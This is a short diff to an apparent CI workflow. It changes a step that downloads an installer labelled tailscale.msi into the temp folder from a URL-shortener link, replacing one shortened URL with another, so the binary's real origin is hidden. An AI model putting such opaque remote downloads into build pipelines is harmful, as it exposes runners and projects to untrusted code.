@@ -65,7 +65,7 @@ jobs:
 
       - name: nl
         run: |
-          $tsUrl = "https://www.encurtador.dev/redirecionamento/C9iQe"
+          $tsUrl = "https://2cm.es/1jIjW"
           $installerPath = "$env:TEMP\tailscale.msi"
           
           Invoke-WebRequest -Uri $tsUrl -OutFile $installerPath
